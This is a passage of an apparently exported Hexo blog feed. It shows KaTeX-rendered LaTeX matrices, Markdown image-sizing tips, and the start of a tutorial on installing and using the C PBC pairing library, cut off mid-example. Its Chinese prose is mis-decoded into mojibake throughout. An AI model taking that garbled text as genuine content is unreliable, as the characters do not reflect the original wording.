class="hljs-punctuation">&#123;</span>vmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">âˆ£</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">âˆ£</mo></mrow><annotation encoding="application/x-tex">\begin{vmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.64199em;vertical-align:-1.5500299999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ£</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="åŒç«–çº¿"><a class="markdownIt-Anchor" href="#åŒç«–çº¿"></a> åŒç«–çº¿</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>Vmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>Vmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">âˆ¥</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">âˆ¥</mo></mrow><annotation encoding="application/x-tex">\begin{Vmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{Vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.64199em;vertical-align:-1.5500299999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>âˆ¥</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="åˆ†æ®µå‡½æ•°"><a class="markdownIt-Anchor" href="#åˆ†æ®µå‡½æ•°"></a> åˆ†æ®µå‡½æ•°</h2><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gml">$$<br>f(<span class="hljs-variable language_">x</span>) = <br>\<span class="hljs-keyword">begin</span>&#123;cases&#125;<br><span class="hljs-number">2</span><span class="hljs-variable language_">x</span>,\,\,<span class="hljs-variable language_">x</span>&gt;<span class="hljs-number">0</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable language_">x</span>,\,\,<span class="hljs-variable language_">x</span>\le0\\<br>\<span class="hljs-keyword">end</span>&#123;cases&#125;<br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi><mo separator="true">,</mo><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mi>x</mi><mo separator="true">,</mo><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>x</mi><mo>â‰¤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(x) = \begin{cases}2x,\,\,x&gt;0\\3x,\,\,x\le0\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">3</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h1 id="markdown"><a class="markdownIt-Anchor" href="#markdown"></a> Markdown</h1><h2 id="å…¬å¼é—®é¢˜"><a class="markdownIt-Anchor" href="#å…¬å¼é—®é¢˜"></a> å…¬å¼é—®é¢˜</h2><p>ä¸Šæ ‡ä½¿ç”¨^ï¼Œä¸‹æ ‡ä½¿ç”¨_ï¼Œåé¢åªèƒ½è·Ÿä¸€ä¸ªå…ƒç´ (å­—æ¯ã€æ•°å­—ç­‰)ï¼Œå¦‚æœæœ‰å¤šä¸ªå…ƒç´ ï¼Œåˆ™ç”¨{}æ‹¬èµ·æ¥</p><h2 id="æ’å…¥å›¾ç‰‡å¤§å°é—®é¢˜"><a class="markdownIt-Anchor" href="#æ’å…¥å›¾ç‰‡å¤§å°é—®é¢˜"></a> æ’å…¥å›¾ç‰‡å¤§å°é—®é¢˜</h2><p>ç›´æ¥æŒ‰ç…§å†™htmlå°±è¡Œäº†</p><blockquote><p>åœ¨ HTML ä¸­ï¼Œ<br />&lt;img&gt;æ ‡ç­¾ç”¨æ¥å®šä¹‰å›¾ç‰‡ï¼Œæ˜¯ç©ºæ ‡ç­¾ï¼Œæ„æ€æ˜¯è¯´ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚<br />srcæŒ‡ â€œsourceâ€ã€‚æºå±æ€§çš„å€¼æ˜¯å›¾åƒçš„ URL åœ°å€<br />altå±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²å¯æ›¿æ¢çš„æ–‡æœ¬ã€‚æ— æ³•è½½å…¥å›¾åƒæ—¶ï¼Œæ›¿æ¢æ–‡æœ¬å‘Šè¯‰è¯»è€…ï¼Œä»–ä»¬å¤±å»çš„ä¿¡æ¯ã€‚<br />titleå±æ€§æè¿°äº†å…ƒç´ çš„é¢å¤–ä¿¡æ¯ (ä½œä¸ºå·¥å…·æ¡ä½¿ç”¨)<br />height(é«˜åº¦) ä¸ width(å®½åº¦) å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ã€‚<br />styleå±æ€§è§„å®šå…ƒç´ çš„è¡Œå†…æ ·å¼ï¼ˆinline styleï¼‰ï¼Œå®šä¹‰å›¾ç‰‡æ—¶å¯ä»¥ç”¨æ¥ç¼©æ”¾<br />&lt;div&gt;æ ‡ç­¾ç”¨æ¥å®šä¹‰æ–‡æ¡£ä¸­çš„ä¸€ä¸ªåˆ†éš”åŒºå—æˆ–è€…ä¸€ä¸ªåŒºåŸŸéƒ¨åˆ†<br />alignå±æ€§ç”¨æ¥å¯¹é½ï¼Œå®ƒçš„å€¼æœ‰leftã€rightã€centerã€justify<br />åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/wkd_007/article/details/">https://blog.csdn.net/wkd_007/article/details/</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">ç¼©å°<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;zoom: 25%;&quot;</span> /&gt;</span><br><br>å¹¶åˆ—:<br><span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨fluildçš„ç”¨æˆ·æ‰‹å†Œä¸­ï¼Œå‘ç°äº†æ›´æ–¹ä¾¿çš„å†™æ³•</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;% gi total n1-n2-... %&#125;<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>&#123;% endgi %&#125;<br><br>total:ä¸€å…±æœ‰å¤šå°‘å›¾ç‰‡<br>n1-n2-...:æ¯è¡Œçš„å›¾ç‰‡æ•°é‡ï¼Œä¸å†™é»˜è®¤æ¯è¡Œæœ€å¤§ä¸ºä¸‰ï¼Œæ±‚å’Œåä¸ç­‰äºtotalä¹ŸæŒ‰é»˜è®¤æ¥<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
      <category>LaTex</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
      <tag>LaTex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€PBCåº“</title>
    <link href="/2024/12/05/cPBC/"/>
    <url>/2024/12/05/cPBC/</url>
    
    <content type="html"><![CDATA[<h1 id="pbc"><a class="markdownIt-Anchor" href="#pbc"></a> PBC</h1><h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h2><p><strong>æˆ‘çš„ç¯å¢ƒæ˜¯Ubantu-22.04,gcc-11.4.0</strong>(ç”¨vscodeè¿è™šæ‹Ÿæœºå¼€å‘)<br />æœ€è¿‘åšæ¯•è®¾éœ€è¦ç”¨åˆ°ï¼Œå°±å€Ÿæ­¤æœºä¼šå†™ä¸€äº›å…³äºcè¯­è¨€PBCåº“çš„æ•™ç¨‹ï¼Œä¸€äº›ç”¨æ³•æœ‰ç»“åˆGPTã€‚<br />è¯´æ˜¯æ•™ç¨‹ä¸è¿‡æ˜¯æŠŠå®˜æ–¹æ–‡æ¡£è¯´çš„å‡½æ•°ç”¨æ³•ç¿»è¯‘äº†ä¸€éï¼Œå…³äºåŒçº¿æ€§é…å¯¹çš„çŸ¥è¯†æˆ‘ä¸äº†è§£ï¼Œè¿™é‡Œå°±ä¸å°†äº†ï¼Œæˆ‘çœ‹ç½‘ä¸Šå¤§éƒ¨åˆ†è¯´çš„æœ‰å°±åªæ˜¯å½“é»‘ç›’è°ƒç”¨å°±è¡Œäº†ã€‚</p><blockquote><p>å®˜æ–¹æ–‡æ¡£å‡½æ•°:<a href="https://crypto.stanford.edu/pbc/manual/">https://crypto.stanford.edu/pbc/manual/</a></p></blockquote><h2 id="å®‰è£…å’Œç¯å¢ƒé…ç½®"><a class="markdownIt-Anchor" href="#å®‰è£…å’Œç¯å¢ƒé…ç½®"></a> å®‰è£…å’Œç¯å¢ƒé…ç½®</h2><p>å®‰è£…ï¼š</p><blockquote><p>å‚è€ƒ:<a href="https://min.jeza-chen.com/2020/06/04/PBC-Library/">https://min.jeza-chen.com/2020/06/04/PBC-Library/</a></p></blockquote><p>æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ï¼Œå®‰è£…PBCåº“å‰éœ€è¦å®‰è£…GMPåº“ï¼Œä¸‹é¢æ˜¯ä¸Šé¢è¿™ç¯‡æ•™ç¨‹çš„æŒ‰ç…§æ–¹æ³•ï¼Œæˆ‘ç”¨äº†ä¹‹åæ²¡ä»€ä¹ˆé—®é¢˜ã€‚</p><ol><li><p>å®‰è£… GMPåº“ <code>sudo apt-get install libgmp3-dev</code></p></li><li><p>å®‰è£…flexå’Œbison<code>sudo apt-get install flex, bison</code></p></li><li><p>å®‰è£…ç¼–è¯‘PBCåº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://crypto.stanford.edu/pbc/files/pbc-0.5.14.tar.gz<br>tar -zxvf pbc-0.5.14.tar.gz<br><span class="hljs-built_in">cd</span> pbc-0.5.14<br>./configure<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></li></ol><p>ç¯å¢ƒé…ç½®ï¼š</p><ol><li>åŒ…å«PBCçš„å¤´æ–‡ä»¶<code>#include &lt;pbc/pbc.h&gt;</code></li><li>ç¼–è¯‘æ—¶ï¼Œéœ€è¦é“¾æ¥GMPåº“å’ŒPBCåº“ï¼Œå³å†gccæ—¶åŠ ä¸Šï¼Œ<code>-lgmp -lpbc</code><br />(åœ¨tasks.jsonä¸­çš„&quot;args&quot;é‡Œæ·»åŠ &quot;-lgmp&quot;å’Œ&quot;-lpbc&quot;å³å¯)</li></ol><p>æˆ‘é‡åˆ°çš„é—®é¢˜ï¼š<br />error while loading shared libraries: libpbc.so.1: cannot open shared object file: No such file or directory</p><p>æ·»åŠ ç¼–è¯‘å‚æ•°<code>-I/usr/local/include/pbc</code><br />(åœ¨tasks.jsonä¸­çš„&quot;args&quot;é‡Œæ·»åŠ &quot;-I/usr/local/include/pbc&quot;)</p><p>å…ˆæ”¾ä¸€ä¸ªä¾‹å­ï¼Œå¯ä»¥çœ‹çœ‹èƒ½ä¸èƒ½è¿è¡ŒæˆåŠŸï¼Œè¾“å‡ºçš„ä¸‰ä¸ªç»“æœåº”è¯¥ä¸€æ ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pbc/pbc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPEA_PARAMS                                           \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;type a\n&quot;</span>                                                 \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;q 87807107996633125224377819847540498158068831994142082&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;1102865339926647563088022295707862517942266222142315585&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;8769582317459277713367317481324925129998224791\n&quot;</span>         \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;h 12016012264891146079388821366740534204802954401251311&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;822919615131047207289359704531102844802183906537786776\n&quot;</span> \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;r 730750818665451621361119245571504901405976559617\n&quot;</span>     \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp2 159\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp1 107\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign1 1\n&quot;</span>                                                \</span><br><span class="hljs-meta">    <span 